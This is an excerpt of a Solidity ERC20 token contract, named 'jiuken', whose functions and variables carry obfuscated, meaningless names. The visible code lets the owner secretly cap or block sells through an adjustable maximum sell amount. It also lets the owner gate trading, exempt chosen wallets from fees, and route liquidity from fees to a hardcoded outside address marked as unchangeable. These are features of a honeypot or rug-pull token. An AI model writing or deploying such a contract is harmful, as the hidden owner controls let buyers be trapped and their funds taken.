...
abstract contract AToken is IERC20, Ownable {
    ...
    uint256 public dxcog;
    uint256 public ddcjk;
    ...
    uint256 public _poij = 100;
    uint256 public _pojut = 0;//N
    uint256 public _ljhu = 0;//N
    uint256 public _lkugg = 100;
    uint256 public _8uy = 0;//N
    ...
    function ssdxcog(uint256 _dxcog) public onlyOwner{
        
        dxcog = _dxcog;
    
    }

    function ce9iuojl(bool status) public onlyOwner {
        limitEnable = status;
    }
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == goMoonBlock) {
                    require(0 < ghjfo && _swapPairList[to], "!ghjfo");
                }
                ...
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        ...
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _poij + _pojut + _lkugg + _ljhu + _8uy;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _lkugg + _ljhu + _8uy;
                require(tAmount <= dxcog,"over max dxcog amount");
            } else {
                swapFee = _poij + _pojut;
                require(tAmount <= ddcjk,"over max amount");
            }
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint256 fundAmount = usdtBalance * (_poij + _lkugg) * 2 / swapFee;
        ...
        if (lpAmount > 0) {
            ...
            if (lpusdtt > 0) {//=0xB821bb072f08A338962272923f9f4221B69094FC (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpusdtt, 0, 0, address(0x70c4355DDd1Ed173a629A6FB4Ff11d5a8e2F2616), block.timestamp
                );
            }
        }
    }
    ...
    uint256 public ghjfo;

    function urjhjb() external onlyOwner {
        ghjfo = 0;
    }

    function gouzipao() external onlyOwner {
        require(0 == goMoonBlock, "trading");
        goMoonBlock = block.number;
    }

    function k9md(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }
    
    function setk9md(address[] memory addrs, bool enable) external onlyFunder {
        for (uint i = 0; i < addrs.length; i++) {
            _feeWhiteList[addrs[i]] = enable;
        }
    }

    function setsk9md(address[] calldata addrs, bool enable) external onlyFunder {
        for (uint i = 0; i < addrs.length; i++) {
        _feeWhiteList[addrs[i]] = enable;
        }
    }
...
contract jiuken is AToken {
    constructor() AToken(
        ...
        18,//De
        1000000,//S
        address(0xD3109C13480759c56724751c00BBED6Edc0746f5),//
        address(0xD3109C13480759c56724751c00BBED6Edc0746f5)//
    ){
    }
}